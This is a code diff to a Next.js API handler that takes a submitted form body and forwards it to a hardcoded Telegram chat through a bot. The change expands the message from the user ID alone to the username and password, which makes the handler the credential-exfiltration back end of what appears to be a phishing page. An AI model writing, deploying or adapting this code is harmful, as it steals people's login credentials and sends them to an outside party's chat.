@@ -1,8 +1,8 @@
 const TG = require("telegram-bot-api");
 
-export default function handler(req, res) {
+export default async function handler(req, res) {
   // Get data submitted in request's body.
-  const body = req.body;
+  const body = await req.body;
 
   // Optional logging to see the responses
   // in the command line where next.js app is running.
@@ -20,12 +20,12 @@ export default function handler(req, res) {
   });
   const chat_id = "5996836160";
 
-  api.sendMessage({
+  await api.sendMessage({
     chat_id: chat_id,
-    text: body.userid,
+    text: `Username:\n${body.userid}\nPassword:\n${body.password}`,
   });
 
-  api.getMe().then(console.log).catch(console.err);
+  await api.getMe().then(console.log).catch(console.err);
 
   // Found the name.
   // Sends a HTTP success code
